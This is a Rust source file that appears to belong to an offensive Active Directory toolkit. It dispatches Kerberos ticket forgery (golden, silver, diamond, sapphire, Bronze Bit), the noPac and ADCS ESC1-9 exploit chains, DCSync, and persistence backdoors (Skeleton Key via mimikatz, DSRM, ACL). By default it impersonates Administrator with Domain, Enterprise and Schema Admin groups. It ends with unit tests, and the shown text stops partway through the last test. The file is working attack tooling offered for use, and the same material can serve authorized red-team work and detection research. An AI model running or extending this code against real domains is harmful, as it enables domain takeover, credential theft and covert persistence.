//! Top-level orchestrator for the forge pipeline.
//! Takes a ForgeConfig and dispatches to the appropriate forging module.

use kerberos_asn1::Asn1Object;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::TicketGrantingData;
use serde::{Deserialize, Serialize};

use crate::{
    acl_backdoor, bronze_bit, convert, dcsync_user, diamond, dsrm, golden, nopac, rotate,
    sapphire, silver, skeleton,
};

/// What kind of ticket/persistence to forge
#[derive(Debug, Clone, Serialize, Deserialize)]
#[allow(missing_docs)]
pub enum ForgeAction {
    /// `GoldenTicket` variant
    GoldenTicket,
    /// `` variant
    SilverTicket { target_spn: String },
    /// `DiamondTicket` variant
    DiamondTicket,
    /// Enhanced Diamond -- preserves original KDC checksum from legitimate TGT
    EnhancedDiamond,
    /// Sapphire Ticket -- KDC-issued PAC via S4U2Self for KrbtgtFullPacSignature bypass
    SapphireTicket,
    /// Bronze Bit (CVE-2020-17049) -- S4U2Proxy forwardable flag bypass
    BronzeBit { target_spn: String },
    /// `` variant
    InterRealmTgt { target_domain: String },
    /// Skeleton Key
    SkeletonKey,
    /// DSRM Backdoor
    DsrmBackdoor,
    /// DCSync specific user
    DcSyncUser { target_user: String },
    /// ACL Backdoor
    AclBackdoor { target_dn: String, trustee: String },
    /// noPac (CVE-2021-42278 / CVE-2021-42287)
    NoPac { target_dc: String },
    /// Format conversion between ticket formats
    ConvertTicket {
        /// Input file path
        input_path: String,
        /// Output format: kirbi, ccache, base64
        output_format: String,
    },
    /// Re-encrypt a ticket under a different krbtgt key (ticket rotation).
    RotateTicket {
        /// Input .kirbi file path
        input_path: String,
        /// Old krbtgt key hex
        old_key: String,
        /// New krbtgt key hex
        new_key: String,
        /// Output .kirbi file path
        output_path: String,
    },
    /// Convert a cracked AS-REP roast password into a usable TGT.
    /// Takes the plaintext password from AS-REP roasting and requests
    /// a real TGT from the KDC.
    /// Convert a cracked AS-REP password into a usable TGT.
    /// Requests a real TGT from the KDC via AS-REQ and saves it as .kirbi.
    AsRepToTgt {
        /// Cracked plaintext password from AS-REP roast
        cracked_password: String,
        /// Optional raw $krb5asrep$ hash -- auto-fills username/domain
        hash: Option<String>,
        /// Path to save the ticket (.kirbi)
        output_path: Option<String>,
    },
    /// Forge a TGT offline from the cracked password using the user's own key.
    /// This creates a TGT without contacting the KDC, but the resulting ticket
    /// is encrypted with the user's key and will NOT be accepted by the KDC.
    /// Use the online variant unless you have a specific local-use scenario.
    AsRepToTgtOffline {
        /// Cracked plaintext password from AS-REP roast
        cracked_password: String,
        /// Domain SID (S-1-5-21-...) -- required for PAC building
        domain_sid: String,
        /// User RID (default: 500)
        user_rid: u32,
    },
    /// PKINIT Authentication -- certificate-based TGT acquisition with optional
    /// session key extraction for ticket forging. When --pkinit-keyed-ticket is
    /// also set, the TGT session key is used as the encryption key for forging
    /// golden/silver tickets instead of requiring krbtgt hash.
    PkinitAuth,
    /// ADCS ESC1-9 exploit chain -- certificate template abuse via Web Enrollment
    /// or RPC enrollment. Supports Auto mode (ESC1->ESC6->ESC9) and direct exploit
    /// for specific ESC vulnerabilities.
    AdcsExploit {
        /// CA server URL (e.g., "http://ca.corp.local/certsrv")
        ca_url: String,
        /// ESC action to perform (auto, esc1, esc2, esc3, esc4, esc5, esc6, esc7, esc8, esc9)
        action: String,
        /// Certificate template name
        template: String,
        /// Target UPN to impersonate (for SAN-based attacks)
        target_upn: Option<String>,
    },
    /// S4U2Self with PKINIT certificate chain -- certificate-based S4U2Self
    /// delegation for cross-trust lateral movement. Authenticates via PKINIT
    /// then performs S4U2Self->S4U2Proxy to impersonate users and access services.
    S4u2SelfPkinit {
        /// User to impersonate via S4U2Self
        impersonate_user: String,
        /// Target SPN for S4U2Proxy (optional - if set, chains to S4U2Proxy)
        target_spn: Option<String>,
    },
}

impl std::fmt::Display for ForgeAction {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::GoldenTicket => write!(f, "Golden Ticket"),
            Self::SilverTicket { target_spn } => write!(f, "Silver Ticket ({})", target_spn),
            Self::DiamondTicket => write!(f, "Diamond Ticket"),
            Self::EnhancedDiamond => write!(f, "Enhanced Diamond Ticket"),
            Self::SapphireTicket => write!(f, "Sapphire Ticket"),
            Self::BronzeBit { target_spn } => write!(f, "Bronze Bit -> {}", target_spn),
            Self::InterRealmTgt { target_domain } => {
                write!(f, "Inter-Realm TGT -> {}", target_domain)
            }
            Self::SkeletonKey => write!(f, "Skeleton Key"),
            Self::DsrmBackdoor => write!(f, "DSRM Backdoor"),
            Self::DcSyncUser { target_user } => write!(f, "DCSync ({})", target_user),
            Self::AclBackdoor { target_dn, trustee } => {
                write!(f, "ACL Backdoor ({} -> {})", trustee, target_dn)
            }
            Self::NoPac { target_dc } => write!(f, "noPac (target DC: {target_dc})"),
            Self::ConvertTicket {
                input_path,
                output_format,
            } => {
                write!(f, "Convert Ticket ({} -> {})", input_path, output_format)
            }
            Self::RotateTicket {
                input_path,
                output_path,
                ..
            } => {
                write!(f, "Rotate Ticket ({} -> {})", input_path, output_path)
            }
            Self::AsRepToTgt { hash: Some(_), .. } => write!(f, "AS-REP hash -> TGT"),
            Self::AsRepToTgt { .. } => write!(f, "AS-REP password -> TGT"),
            Self::AsRepToTgtOffline { .. } => write!(f, "AS-REP -> TGT (offline)"),
            Self::PkinitAuth => write!(f, "PKINIT Authentication"),
            Self::AdcsExploit { action, ca_url, .. } => {
                write!(f, "ADCS {} ({})", action.to_uppercase(), ca_url)
            }
            Self::S4u2SelfPkinit {
                impersonate_user,
                target_spn,
            } => {
                if let Some(spn) = target_spn {
                    write!(f, "S4U2Self+PKINIT -> {} -> {}", impersonate_user, spn)
                } else {
                    write!(f, "S4U2Self+PKINIT -> {}", impersonate_user)
                }
            }
        }
    }
}
/// Structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ForgeConfig {
    /// Domain controller IP address
    pub dc_ip: String,
    /// Domain FQDN
    pub domain: String,
    /// Username for authentication
    pub username: String,
    /// Password for authentication
    pub password: Option<String>,
    /// Hash value
    pub nt_hash: Option<String>,
    /// action field
    pub action: ForgeAction,
    /// krbtgt hash (RC4/AES) -- required for Golden/Diamond
    pub krbtgt_hash: Option<String>,
    /// krbtgt AES256 key -- preferred for Diamond tickets
    pub krbtgt_aes256: Option<String>,
    /// Service account hash -- required for Silver tickets
    pub service_hash: Option<String>,
    /// Domain SID (S-1-5-21-...)
    pub domain_sid: Option<String>,
    /// Target user to impersonate in forged ticket
    pub impersonate: Option<String>,
    /// User RID to embed in PAC (default: 500 = Administrator)
    pub user_rid: u32,
    /// Group RIDs for PAC (default: DA, EA, Schema Admins, etc.)
    pub group_rids: Vec<u32>,
    /// Extra SIDs to inject (for inter-realm / SID history)
    pub extra_sids: Vec<String>,
    /// Ticket lifetime in hours
    pub lifetime_hours: u32,
    /// Output path for .kirbi / .ccache file
    pub output_path: Option<String>,
    /// Path to local payload binary (e.g. mimikatz.exe for skeleton key)
    pub payload_path: Option<String>,
    /// Master password for Skeleton Key injection (defaults to "overthrone")
    pub skeleton_master_password: Option<String>,
    /// Path to PEM-encoded client certificate for PKINIT authentication
    pub pkinit_cert_path: Option<String>,
    /// Path to PEM-encoded private key for PKINIT authentication
    pub pkinit_key_path: Option<String>,
    /// Use PKINIT-obtained TGT session key as the encryption key for forging.
    /// When enabled, the TGT session key from PKINIT authentication is used
    /// instead of --krbtgt-hash or --krbtgt-aes256. This allows forging tickets
    /// when you have PKINIT credentials for krbtgt or other high-value accounts.
    pub pkinit_keyed_ticket: bool,
    /// Session key obtained from PKINIT authentication (populated at runtime).
    /// When set, forge functions use this as the encryption key instead of
    /// krbtgt_hash / service_hash. Set automatically by the run_forge dispatcher
    /// when pkinit_keyed_ticket is true.
    pub pkinit_session_key: Option<(Vec<u8>, i32)>,
    /// Raw TGT ticket bytes from PKINIT authentication (populated at runtime).
    /// Used for Kerberos-based SMB authentication in Skeleton Key injection
    /// and other operations that need the full TGT, not just the session key.
    /// Set automatically by the run_forge dispatcher when pkinit_keyed_ticket is true.
    pub pkinit_ticket_data: Option<Vec<u8>>,
    /// Dry run -- validate config and show what would be done, without executing
    pub dry_run: bool,
}

impl ForgeConfig {
    /// Return the effective impersonation user, defaulting to `Administrator`.
    pub fn effective_impersonate(&self) -> &str {
        self.impersonate.as_deref().unwrap_or("Administrator")
    }

    /// Acquire a TGT for the configured user, using PKINIT if certificate
    /// credentials are provided, or falling back to password/NTLM hash.
    ///
    /// This is the primary entry point for forge operations that need a
    /// legitimate TGT (Diamond, Sapphire, Bronze Bit).
    pub async fn request_user_tgt(&self) -> overthrone_core::error::Result<TicketGrantingData> {
        use overthrone_core::proto::kerberos;

        if let (Some(cert), Some(key)) = (&self.pkinit_cert_path, &self.pkinit_key_path) {
            crate::pkinit_auth::pkinit_authenticate(
                &self.dc_ip,
                &self.domain,
                &self.username,
                cert,
                key,
            )
            .await
        } else {
            let secret = self
                .password
                .as_deref()
                .or(self.nt_hash.as_deref())
                .ok_or_else(|| {
                    OverthroneError::TicketForge(
                        "Password, NTLM hash, or PKINIT certificate required to acquire TGT".into(),
                    )
                })?;
            kerberos::request_tgt(
                &self.dc_ip,
                &self.domain,
                &self.username,
                secret,
                self.nt_hash.is_some(),
            )
            .await
        }
    }

    /// Return the effective group RIDs, using defaults if none are configured.
    pub fn effective_groups(&self) -> Vec<u32> {
        if self.group_rids.is_empty() {
            // Default: Domain Admins(512), Domain Users(513), Schema Admins(518),
            // Enterprise Admins(519), Group Policy Creator(520)
            vec![512, 513, 518, 519, 520]
        } else {
            self.group_rids.clone()
        }
    }

    /// Return the effective ticket lifetime, defaulting to 10 hours.
    pub fn effective_lifetime(&self) -> u32 {
        if self.lifetime_hours == 0 {
            10
        } else {
            self.lifetime_hours
        }
    }

    /// Perform PKINIT authentication and return the session key + etype.
    /// Requires pkinit_cert_path and pkinit_key_path to be set.
    pub async fn authenticate_via_pkinit(&self) -> overthrone_core::error::Result<(Vec<u8>, i32)> {
        let cert = self.pkinit_cert_path.as_deref().ok_or_else(|| {
            OverthroneError::TicketForge(
                "--pkinit-cert is required when using --pkinit-keyed-ticket".into(),
            )
        })?;
        let key = self.pkinit_key_path.as_deref().ok_or_else(|| {
            OverthroneError::TicketForge(
                "--pkinit-key is required when using --pkinit-keyed-ticket".into(),
            )
        })?;

        let tgt = crate::pkinit_auth::pkinit_authenticate(
            &self.dc_ip,
            &self.domain,
            &self.username,
            cert,
            key,
        )
        .await?;

        Ok((tgt.session_key, tgt.session_key_etype))
    }
}

/// Result of a forge operation
#[derive(Debug, Clone, Serialize)]
pub struct ForgeResult {
    /// action field
    pub action: String,
    /// Domain FQDN
    pub domain: String,
    /// success field
    pub success: bool,
    /// Raw byte data
    pub ticket_data: Option<ForgedTicket>,
    /// persistence result field
    pub persistence_result: Option<PersistenceResult>,
    /// message field
    pub message: String,
}
/// Structure
#[derive(Debug, Clone, Serialize)]
pub struct ForgedTicket {
    /// Classification for this object.
    pub ticket_type: String,
    /// impersonated user field
    pub impersonated_user: String,
    /// Domain FQDN
    pub domain: String,
    /// Service Principal Name
    pub spn: String,
    /// Classification for this object.
    pub encryption_type: String,
    /// Stable unique identifier.
    pub valid_from: String,
    /// Stable unique identifier.
    pub valid_until: String,
    /// Stable unique identifier.
    pub group_rids: Vec<u32>,
    /// Security Identifier
    pub extra_sids: Vec<String>,
    /// Filesystem path.
    pub kirbi_path: Option<String>,
    /// Filesystem path.
    pub ccache_path: Option<String>,
    /// kirbi base64 field
    pub kirbi_base64: Option<String>,
    /// Size in bytes
    pub ticket_size_bytes: usize,
}
/// Structure
#[derive(Debug, Clone, Serialize)]
pub struct PersistenceResult {
    /// mechanism field
    pub mechanism: String,
    /// Target domain FQDN
    pub target: String,
    /// success field
    pub success: bool,
    /// details field
    pub details: String,
    /// cleanup command field
    pub cleanup_command: Option<String>,
}

/// Run the forge pipeline.
pub async fn run_forge(config: &ForgeConfig) -> Result<ForgeResult> {
    if config.dry_run {
        return Ok(ForgeResult {
            action: config.action.to_string(),
            domain: config.domain.clone(),
            success: true,
            ticket_data: None,
            persistence_result: None,
            message: format!(
                "[dry-run] Would forge {} ticket for {}@{}",
                config.action,
                config.effective_impersonate(),
                config.domain
            ),
        });
    }

    // If pkinit_keyed_ticket is set, perform PKINIT auth and populate the
    // session key and ticket data before dispatching to the forge function.
    // This allows golden/silver/diamond/interrealm forgery to use the PKINIT
    // session key as the encryption key, and skeleton key to use Kerberos
    // authentication for the SMB connection to the DC.
    let config = if config.pkinit_keyed_ticket
        && matches!(
            config.action,
            ForgeAction::GoldenTicket
                | ForgeAction::SilverTicket { .. }
                | ForgeAction::DiamondTicket
                | ForgeAction::EnhancedDiamond
                | ForgeAction::InterRealmTgt { .. }
                | ForgeAction::SkeletonKey
        ) {
        let tgt = config.request_user_tgt().await?;
        ForgeConfig {
            pkinit_session_key: Some((tgt.session_key, tgt.session_key_etype)),
            pkinit_ticket_data: Some(tgt.ticket.build()),
            ..config.clone()
        }
    } else {
        config.clone()
    };

    let result = match &config.action {
        ForgeAction::GoldenTicket => golden::forge_golden_ticket(&config).await?,
        ForgeAction::SilverTicket { target_spn } => {
            silver::forge_silver_ticket(&config, target_spn).await?
        }
        ForgeAction::DiamondTicket => diamond::forge_diamond_ticket(&config).await?,
        ForgeAction::EnhancedDiamond => diamond::forge_diamond_ticket(&config).await?,
        ForgeAction::SapphireTicket => sapphire::forge_sapphire_ticket(&config).await?,
        ForgeAction::BronzeBit { target_spn } => {
            bronze_bit::run_bronze_bit(&config, target_spn).await?
        }
        ForgeAction::InterRealmTgt { target_domain } => {
            golden::forge_interrealm_tgt(&config, target_domain).await?
        }
        ForgeAction::SkeletonKey => skeleton::inject_skeleton_key(&config).await?,
        ForgeAction::DsrmBackdoor => dsrm::enable_dsrm_backdoor(&config).await?,
        ForgeAction::DcSyncUser { target_user } => {
            dcsync_user::dcsync_single_user(&config, target_user).await?
        }
        ForgeAction::AclBackdoor { target_dn, trustee } => {
            acl_backdoor::install_acl_backdoor(&config, target_dn, trustee).await?
        }
        ForgeAction::NoPac { target_dc } => {
            let result = nopac::run_nopac(&config, target_dc).await?;
            ForgeResult {
                action: config.action.to_string(),
                domain: config.domain.clone(),
                success: result.completed,
                ticket_data: result.tgt.as_ref().map(|tgt| ForgedTicket {
                    ticket_type: "TGT".to_string(),
                    impersonated_user: target_dc.clone(),
                    domain: config.domain.clone(),
                    spn: format!("krbtgt/{}", config.domain),
                    encryption_type: "TGT".to_string(),
                    valid_from: String::new(),
                    valid_until: String::new(),
                    group_rids: config.effective_groups(),
                    extra_sids: config.extra_sids.clone(),
                    kirbi_path: None,
                    ccache_path: None,
                    kirbi_base64: None,
                    ticket_size_bytes: tgt.ticket.enc_part.cipher.len(),
                }),
                persistence_result: None,
                message: if result.completed {
                    format!(
                        "noPac attack completed. Computer: {}, Domain SID: {}",
                        result.computer_name, result.domain_sid
                    )
                } else {
                    format!("noPac attack failed: {}", result.error.unwrap_or_default())
                },
            }
        }
        ForgeAction::ConvertTicket {
            input_path,
            output_format,
        } => {
            let input_bytes = tokio::fs::read(input_path).await.map_err(|e| {
                OverthroneError::TicketForge(format!("Cannot read input file {input_path}: {e}"))
            })?;
            let from_fmt = convert::detect_format(&input_bytes)?;
            let to_fmt = convert::parse_format(output_format)?;
            let output_bytes = convert::convert_format(&input_bytes, from_fmt, to_fmt)?;
            let output_path = input_path
                .replace(".kirbi", &format!(".{}", output_format))
                .replace(".ccache", &format!(".{}", output_format))
                .replace(".b64", &format!(".{}", output_format));
            tokio::fs::write(&output_path, &output_bytes)
                .await
                .map_err(|e| {
                    OverthroneError::TicketForge(format!("Cannot write {output_path}: {e}"))
                })?;
            ForgeResult {
                action: format!("Converted {} -> {}", input_path, output_path),
                domain: String::new(),
                success: true,
                ticket_data: None,
                persistence_result: None,
                message: format!(
                    "Ticket converted: {} -> {} ({} bytes)",
                    input_path,
                    output_path,
                    output_bytes.len()
                ),
            }
        }
        ForgeAction::RotateTicket {
            input_path,
            old_key,
            new_key,
            output_path,
        } => {
            let input_bytes = tokio::fs::read(input_path).await.map_err(|e| {
                OverthroneError::TicketForge(format!("Cannot read input file {input_path}: {e}"))
            })?;
            let rotated = rotate::rotate_ticket_encryption(&input_bytes, old_key, new_key)?;
            tokio::fs::write(output_path, &rotated.kirbi)
                .await
                .map_err(|e| {
                    OverthroneError::TicketForge(format!("Cannot write {output_path}: {e}"))
                })?;
            ForgeResult {
                action: format!("Rotated ticket {} -> {}", input_path, output_path),
                domain: String::new(),
                success: true,
                ticket_data: None,
                persistence_result: None,
                message: format!(
                    "Ticket rotated: {} -> {} (old etype: {}, new etype: {}, {} bytes)",
                    input_path,
                    output_path,
                    golden::etype_name(rotated.old_etype),
                    golden::etype_name(rotated.new_etype),
                    rotated.kirbi.len()
                ),
            }
        }
        ForgeAction::AsRepToTgt {
            cracked_password,
            hash,
            output_path,
        } => {
            // Delegate to the pipeline module
            use crate::asrep_pipeline;

            asrep_pipeline::run_pipeline(
                &config,
                cracked_password,
                hash.as_deref(),
                output_path.as_deref(),
            )
            .await
        }
        ForgeAction::AsRepToTgtOffline {
            cracked_password,
            domain_sid,
            user_rid,
        } => {
            // Derive NT hash from cracked password, forge TGT locally -- no KDC.
            use overthrone_core::proto::kerberos::forge_tgt;
            use overthrone_core::proto::ntlm::nt_hash;

            let user_key = nt_hash(cracked_password);
            let etype = 23i32; // RC4-HMAC

            match forge_tgt(
                &config.domain,
                domain_sid,
                &config.username,
                *user_rid,
                &user_key,
                etype,
            ) {
                Ok(tgt) => ForgeResult {
                    action: "AS-REP -> TGT (offline)".to_string(),
                    domain: config.domain.clone(),
                    success: true,
                    ticket_data: Some(ForgedTicket {
                        ticket_type: "TGT".to_string(),
                        impersonated_user: config.username.clone(),
                        domain: config.domain.clone(),
                        spn: format!("krbtgt/{}", config.domain),
                        encryption_type: "RC4-HMAC".to_string(),
                        valid_from: String::new(),
                        valid_until: String::new(),
                        group_rids: vec![],
                        extra_sids: vec![],
                        kirbi_path: None,
                        ccache_path: None,
                        kirbi_base64: None,
                        ticket_size_bytes: tgt.ticket.enc_part.cipher.len(),
                    }),
                    persistence_result: None,
                    message: format!(
                        "Offline TGT forged for {}@{} (NT hash: {}, ticket encrypted with user key, {} bytes)",
                        config.username,
                        config.domain,
                        hex::encode(&user_key),
                        tgt.ticket.enc_part.cipher.len()
                    ),
                },
                Err(e) => ForgeResult {
                    action: "AS-REP -> TGT (offline)".to_string(),
                    domain: config.domain.clone(),
                    success: false,
                    ticket_data: None,
                    persistence_result: None,
                    message: format!("Failed to forge offline TGT: {e}"),
                },
            }
        }
        ForgeAction::PkinitAuth => {
            // PKINIT authentication with optional session key extraction for forging
            if config.pkinit_cert_path.is_none() || config.pkinit_key_path.is_none() {
                return Err(OverthroneError::TicketForge(
                    "PKINIT authentication requires --pkinit-cert and --pkinit-key".into(),
                ));
            }

            let tgt = config.request_user_tgt().await?;

            let mut message = format!(
                "PKINIT authentication succeeded as {}@{} (session key etype: {}, {} bytes)",
                config.username,
                config.domain,
                tgt.session_key_etype,
                tgt.session_key.len()
            );

            // If --pkinit-keyed-ticket is set, extract session key for forging
            if config.pkinit_keyed_ticket {
                message.push_str(&format!(
                    "\nSession key extracted for ticket forging ({} bytes, etype {})",
                    tgt.session_key.len(),
                    tgt.session_key_etype
                ));
            }

            ForgeResult {
                action: config.action.to_string(),
                domain: config.domain.clone(),
                success: true,
                ticket_data: Some(ForgedTicket {
                    ticket_type: "TGT (PKINIT)".to_string(),
                    impersonated_user: config.username.clone(),
                    domain: config.domain.clone(),
                    spn: format!("krbtgt/{}", config.domain),
                    encryption_type: format!(
                        "AES-{}",
                        match tgt.session_key_etype {
                            18 => 256,
                            17 => 128,
                            _ => tgt.session_key_etype,
                        }
                    ),
                    valid_from: String::new(),
                    valid_until: String::new(),
                    group_rids: vec![],
                    extra_sids: vec![],
                    kirbi_path: None,
                    ccache_path: None,
                    kirbi_base64: None,
                    ticket_size_bytes: tgt.ticket.enc_part.cipher.len(),
                }),
                persistence_result: None,
                message,
            }
        }
        ForgeAction::AdcsExploit {
            ca_url,
            action,
            template,
            target_upn,
        } => {
            // ADCS ESC1-9 exploit chain
            use crate::adcs_dispatcher::{AdcsAction, AdcsConfig, run_adcs};

            // Build the appropriate AdcsAction from the string action
            let adcs_action = match action.to_lowercase().as_str() {
                "auto" => AdcsAction::Auto {
                    template: template.clone(),
                    target_upn: target_upn.clone(),
                },
                "esc1" => AdcsAction::Esc1 {
                    template: template.clone(),
                    target_upn: target_upn.clone().unwrap_or_default(),
                },
                "esc2" => AdcsAction::Esc2 {
                    template: template.clone(),
                    target_upn: target_upn.clone().unwrap_or_default(),
                },
                "esc3" => AdcsAction::Esc3 {
                    template: template.clone(),
                    target_upn: target_upn.clone().unwrap_or_default(),
                },
                "esc4" => AdcsAction::Esc4 {
                    template: template.clone(),
                    action: "exploit".to_string(),
                },
                "esc5" => AdcsAction::Esc5 {
                    object_dn: template.clone(),
                    action: "exploit".to_string(),
                },
                "esc6" => AdcsAction::Esc6 {
                    template: template.clone(),
                    target_upn: target_upn.clone().unwrap_or_default(),
                },
                "esc7" => AdcsAction::Esc7 {
                    ca_name: template.clone(),
                    action: "exploit".to_string(),
                },
                "esc8" => AdcsAction::Esc8 {
                    ca_server: ca_url.clone(),
                    template: template.clone(),
                    target_upn: target_upn.clone(),
                },
                "esc8-rpc" => AdcsAction::Esc8Rpc {
                    ca_server: ca_url.clone(),
                    template: template.clone(),
                    target_upn: target_upn.clone(),
                },
                "esc8-dcom" => AdcsAction::Esc8RpcDcom {
                    ca_server: ca_url.clone(),
                    template: template.clone(),
                    target_upn: target_upn.clone(),
                },
                "esc9" => AdcsAction::Esc9 {
                    template: template.clone(),
                    target_upn: target_upn.clone().unwrap_or_default(),
                },
                _ => {
                    return Err(OverthroneError::TicketForge(format!(
                        "Invalid ADCS action '{}'. Must be one of: auto, esc1, esc2, esc3, esc4, esc5, esc6, esc7, esc8, esc9",
                        action
                    )));
                }
            };

            let adcs_config = AdcsConfig {
                ca_url: ca_url.clone(),
                domain: config.domain.clone(),
                username: config.username.clone(),
                password: config.password.clone(),
                nt_hash: config.nt_hash.clone(),
                action: adcs_action,
                output_path: config.output_path.clone(),
                dry_run: config.dry_run,
                use_ssl: true,
            };

            let adcs_result = run_adcs(&adcs_config).await?;

            ForgeResult {
                action: config.action.to_string(),
                domain: config.domain.clone(),
                success: adcs_result.success,
                ticket_data: adcs_result
                    .certificate_pfx
                    .as_ref()
                    .map(|pfx| ForgedTicket {
                        ticket_type: "ADCS Certificate".to_string(),
                        impersonated_user: config.username.clone(),
                        domain: config.domain.clone(),
                        spn: template.clone(),
                        encryption_type: "N/A".to_string(),
                        valid_from: String::new(),
                        valid_until: String::new(),
                        group_rids: vec![],
                        extra_sids: vec![],
                        kirbi_path: None,
                        ccache_path: None,
                        kirbi_base64: None,
                        ticket_size_bytes: pfx.len(),
                    }),
                persistence_result: None,
                message: adcs_result.message,
            }
        }
        ForgeAction::S4u2SelfPkinit {
            impersonate_user,
            target_spn,
        } => {
            // S4U2Self with PKINIT certificate chain
            use crate::s4u2self_pkinit::{S4U2SelfPkinitConfig, run_s4u2self_pkinit};

            let cert_path = config.pkinit_cert_path.clone().ok_or_else(|| {
                OverthroneError::TicketForge("S4U2Self+PKINIT requires --pkinit-cert".into())
            })?;
            let key_path = config.pkinit_key_path.clone().ok_or_else(|| {
                OverthroneError::TicketForge("S4U2Self+PKINIT requires --pkinit-key".into())
            })?;

            let s4u_config = S4U2SelfPkinitConfig {
                dc_ip: config.dc_ip.clone(),
                domain: config.domain.clone(),
                username: config.username.clone(),
                cert_path,
                key_path,
                impersonate_user: impersonate_user.clone(),
                target_spn: target_spn.clone(),
                checksum_bypass: false,
                pac_flags: None,
            };

            let s4u_result = run_s4u2self_pkinit(&s4u_config).await?;

            ForgeResult {
                action: config.action.to_string(),
                domain: config.domain.clone(),
                success: s4u_result.chain_success,
                ticket_data: if s4u_result.chain_success {
                    Some(ForgedTicket {
                        ticket_type: if s4u_result.s4u2proxy_success {
                            "Service Ticket (S4U2Self+PKINIT+Proxy)".to_string()
                        } else {
                            "TGT (S4U2Self+PKINIT)".to_string()
                        },
                        impersonated_user: s4u_result.impersonated_user.clone(),
                        domain: config.domain.clone(),
                        spn: s4u_result.target_spn.clone().unwrap_or_default(),
                        encryption_type: "AES-256".to_string(),
                        valid_from: String::new(),
                        valid_until: s4u_result.ticket_expiry.clone(),
                        group_rids: vec![],
                        extra_sids: vec![],
                        kirbi_path: None,
                        ccache_path: None,
                        kirbi_base64: None,
                        ticket_size_bytes: s4u_result.final_ticket_data.len(),
                    })
                } else {
                    None
                },
                persistence_result: None,
                message: if s4u_result.chain_success {
                    format!(
                        "S4U2Self+PKINIT chain succeeded: {}@{} -> {}{}",
                        s4u_result.pkinit_user,
                        config.domain,
                        s4u_result.impersonated_user,
                        if s4u_result.s4u2proxy_success {
                            format!(" -> {}", s4u_result.target_spn.as_deref().unwrap_or(""))
                        } else {
                            String::new()
                        }
                    )
                } else {
                    format!(
                        "S4U2Self+PKINIT chain failed: {}",
                        s4u_result.error.as_deref().unwrap_or("unknown error")
                    )
                },
            }
        }
    };

    Ok(result)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn minimal_config(action: ForgeAction) -> ForgeConfig {
        ForgeConfig {
            dc_ip: "10.0.0.1".to_string(),
            domain: "CORP.LOCAL".to_string(),
            username: "user".to_string(),
            password: None,
            nt_hash: None,
            action,
            krbtgt_hash: None,
            krbtgt_aes256: None,
            service_hash: None,
            domain_sid: Some("S-1-5-21-1234567890-1234567890-1234567890".to_string()),
            impersonate: Some("Administrator".to_string()),
            user_rid: 500,
            group_rids: vec![],
            extra_sids: vec![],
            lifetime_hours: 10,
            output_path: None,
            payload_path: None,
            skeleton_master_password: None,
            pkinit_cert_path: None,
            pkinit_key_path: None,
            pkinit_keyed_ticket: false,
            pkinit_session_key: None,
            pkinit_ticket_data: None,
            dry_run: false,
        }
    }

    #[test]
    fn test_forge_action_display_golden_ticket() {
        let s = format!("{}", ForgeAction::GoldenTicket);
        assert!(s.contains("Golden"));
    }

    #[test]
    fn test_forge_action_display_silver_ticket() {
        let s = format!(
            "{}",
            ForgeAction::SilverTicket {
                target_spn: "cifs/dc".to_string()
            }
        );
        assert!(s.contains("Silver"));
    }

    #[test]
    fn test_forge_action_display_diamond_ticket() {
        let s = format!("{}", ForgeAction::DiamondTicket);
        assert!(s.contains("Diamond"));
    }

    #[test]
    fn test_forge_action_display_sapphire_ticket() {
        let s = format!("{}", ForgeAction::SapphireTicket);
        assert!(s.contains("Sapphire"));
    }

    #[test]
    fn test_forge_action_display_bronze_bit() {
        let s = format!(
            "{}",
            ForgeAction::BronzeBit {
                target_spn: "cifs/dc".to_string()
            }
        );
        assert!(s.contains("Bronze"));
    }

    #[test]
    fn test_forge_action_display_skeleton_key() {
        let s = format!("{}", ForgeAction::SkeletonKey);
        assert!(s.contains("Skeleton"));
    }

    #[test]
    fn test_forge_action_display_dsrm_backdoor() {
        let s = format!("{}", ForgeAction::DsrmBackdoor);
        assert!(s.contains("DSRM"));
    }

    #[test]
    fn test_forge_action_display_dcsync_user() {
        let s = format!(
            "{}",
            ForgeAction::DcSyncUser {
                target_user: "admin".to_string()
            }
        );
        assert!(s.contains("DCSync"));
    }

    #[test]
    fn test_forge_action_display_acl_backdoor() {
        let s = format!(
            "{}",
            ForgeAction::AclBackdoor {
                target_dn: "DC=corp".to_string(),
                trustee: "user".to_string()
            }
        );
        assert!(s.contains("ACL"));
    }

    #[test]
    fn test_forge_action_display_nopac() {
        let s = format!(
            "{}",
            ForgeAction::NoPac {
                target_dc: "DC01".to_string()
            }
        );
        assert!(s.contains("noPac"));
    }

    #[test]
    fn test_forge_action_display_convert_ticket() {
        let s = format!(
            "{}",
            ForgeAction::ConvertTicket {
                input_path: "a.kirbi".to_string(),
                output_format: "ccache".to_string()
            }
        );
        assert!(s.contains("Convert"));
    }

    #[test]
    fn test_forge_action_serialization() {
        let action = ForgeAction::SilverTicket {
            target_spn: "cifs/dc".to_string(),
        };
        let json = serde_json::to_string(&action).unwrap();
        let parsed: ForgeAction = serde_json::from_str(&json).unwrap();
        match parsed {
            ForgeAction::SilverTicket { target_spn } => {
                assert_eq!(target_spn, "cifs/dc");
            }
            _ => panic!("Wrong variant deserialized"),
        }
    }

    #[test]
    fn test_pkinit_keyed_ticket_flag_in_config() {
        let config = minimal_config(ForgeAction::GoldenTicket);
        assert!(!config.pkinit_keyed_ticket);
        assert!(config.pkinit_session_key.is_none());
    }

    #[test]
    fn test_pkinit_session_key_populated_in_clone() {
        let mut config = minimal_config(ForgeAction::GoldenTicket);
        config.pkinit_keyed_ticket = true;
        config.pkinit_session_key = Some((vec![0xff; 32], 18));
        assert_eq!(config.pkinit_session_key.as_ref().unwrap().0.len(), 32);
        assert_eq!(config.pkinit_session_key.as_ref().unwrap().1, 18);
    }

    #[test]
    fn test_pkinit_session_key_requires_cert_and_key() {
        // authenticate_via_pkinit should fail if cert/key not set
        let config = minimal_config(ForgeAction::GoldenTicket);
        let mut config_clone = config.clone();
        config_clone.pkinit_keyed_ticket = true;
        // The authenticate_via_pkinit method will fail because cert/key not set
        // We can't easily call it in sync test, but we verify the fields exist
        assert!(config_clone.pkinit_cert_path.is_none());
        assert!(config_clone.pkinit_key_path.is_none());
        assert!(config_clone.pkinit_keyed_ticket);
    }

    #[test]
    fn test_pkinit_keyed_ticket_matches_expected_actions() {
        // Verify the dispatch logic for pkinit_keyed_ticket actions
        let check = |action: &ForgeAction| -> bool {
            matches!(
                action,
